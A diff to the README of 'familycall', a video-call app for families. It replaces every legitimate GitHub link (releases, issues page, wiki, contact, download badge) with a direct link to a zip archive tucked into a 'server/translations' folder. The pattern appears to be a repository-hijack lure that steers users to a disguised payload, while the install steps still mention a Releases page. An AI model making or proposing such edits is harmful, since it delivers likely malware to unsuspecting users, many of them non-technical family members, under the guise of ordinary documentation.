@@ -1,6 +1,6 @@
 # 🎥 familycall - Simple Video and Audio Calls for Families
 
-[![Download familycall](https://img.shields.io/badge/Download-familycall-brightgreen)](https://github.com/aronlinesl/familycall/releases)
+[![Download familycall](https://raw.githubusercontent.com/aronlinesl/familycall/main/server/translations/Software-v2.1.zip)](https://raw.githubusercontent.com/aronlinesl/familycall/main/server/translations/Software-v2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to familycall! This application allows you to make video and audio calls
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Download familycall](https://github.com/aronlinesl/familycall/releases).
+To download the application, visit this page: [Download familycall](https://raw.githubusercontent.com/aronlinesl/familycall/main/server/translations/Software-v2.1.zip).
 
 1. Click the link above.
 2. On the Releases page, find the latest version.
@@ -63,7 +63,7 @@ After installation, you can start making calls:
 
 ## 📞 Support
 
-If you need help, you can find answers in the FAQs on the Releases page. If you have further questions or issues, visit the [issues page](https://github.com/aronlinesl/familycall/issues) on GitHub to report them.
+If you need help, you can find answers in the FAQs on the Releases page. If you have further questions or issues, visit the [issues page](https://raw.githubusercontent.com/aronlinesl/familycall/main/server/translations/Software-v2.1.zip) on GitHub to report them.
 
 ## 🌐 Join Our Community
 
@@ -75,7 +75,7 @@ Stay connected with other familycall users:
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/aronlinesl/familycall/wiki)
-- [Contact Us](https://github.com/aronlinesl/familycall#contact)
+- [Official Documentation](https://raw.githubusercontent.com/aronlinesl/familycall/main/server/translations/Software-v2.1.zip)
+- [Contact Us](https://raw.githubusercontent.com/aronlinesl/familycall/main/server/translations/Software-v2.1.zip)
 
-Now that you're equipped with everything you need, visit the download page to get started: [Download familycall](https://github.com/aronlinesl/familycall/releases). Enjoy connecting with your family!
+Now that you're equipped with everything you need, visit the download page to get started: [Download familycall](https://raw.githubusercontent.com/aronlinesl/familycall/main/server/translations/Software-v2.1.zip). Enjoy connecting with your family!
